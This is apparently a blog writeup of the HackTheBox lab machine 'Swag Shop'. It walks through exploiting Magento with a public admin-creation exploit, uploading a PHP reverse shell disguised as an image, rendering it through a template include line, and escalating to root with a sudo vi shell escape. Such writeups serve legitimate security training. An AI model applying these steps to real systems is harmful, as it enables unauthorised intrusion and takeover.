---
layout: post
title:  "HTB - Swag Shop"
date:   2019-09-05 20:00 +0100
tags: writeups
---
Link: hhttps://www.hackthebox.eu/home/machines/profile/188
IP: 10.10.10.140

<!--more-->

## Recon

```
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
```
It seems, Ports 22 and 80 are open.

## gobuster
A quick gobuster reveals some stuff:
```
```
By poking around in the dirs a bit, one can find `/app/etc/local.xml`, which holds some creds (seemingly for mysql4):  
`root:fMVWh7bDHpgZkyfqQXreTjU9`  
as well as a crypt key:  
`b355a9e0cd018d3f7f03607141518419`
The DB name is `swagshop`.  

As we don't have any running creds, we switch to running an exploit to generate some.  
37977.py works after a quick code cleanup and setting the target to `$IP/index.php`.  
The admin interface is located at `/index.php/admin`.  
Thanks to the exploit we end up with an admin login `forme:forme`.  

## Admin interface & shell
After logging in, we need a reverse shell.  
Most of this is based on the [Froghopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper) attack, so have a look there.  
Prepare a [php reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) (shell.php) with your IP and Port,  
then rename it to .jpg.  
That can be uploaded as the image for a new Category (Catalog -> Manage Categories -> Add Category).  
If everything worked well, the file will show up under `/media/catalog/category/`.
Now, to execute the shell, it has to be called. To do that, we need to activate symlinks in System - Configuration - Developer - Template Settings.  
Then create a new *Newsletter Template* and enter the following content:  
`{{block type="core/template" template='../../../../../../media/catalog/category/shell.jpg'}}`  
Afterwards, click "preview" to force the server to render the php shell. *User* :)

## Road to root
First time using [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
```
If you know the current user password, write it here for better results: 
---

        User: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0000

    Hostname: swagshop
       Linux: 4.4.0-146-generic
Distribution: Ubuntu 16.04.6 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
---
[*] sud040 Can we read /etc/sudoers?....................................... yes!
[*] sud050 Do we know if any other users used sudo?........................ yes!
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. nope
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. skip
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys030 Can we read /etc/shadow file?................................... nope
[!] sys030 Can we read /etc/shadow- file?.................................. nope
[!] sys030 Can we read /etc/shadow~ file?.................................. nope
[!] sys030 Can we read /etc/master.passwd file?............................ nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[!] ret050 Can we write to executable paths present in cron jobs........... skip
[*] ret060 Can we write to any paths present in cron jobs.................. skip
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... skip
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Namerservers.................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. skip
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... skip
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
==============================================================( processes )=====
[!] pro000 Can we write in any process binary?............................. nope
[*] pro010 Processes running with root permissions......................... yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope

==================================( FINISHED )==================================
```

There's a thing that catched my attention immediately:  
```
ser www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```
because I know that I can [spawn shells within vi](http://web.physics.ucsb.edu/~pcs/apps/editors/vi/vi_unix.html)!  
So it's a matter of running `sudo vi /var/www/html/LICENSE.txt` and then `:!bash`. *Root*  

An interesting thing is that it'll tell you that you can use the root flag as password for their real beta swag shop ^^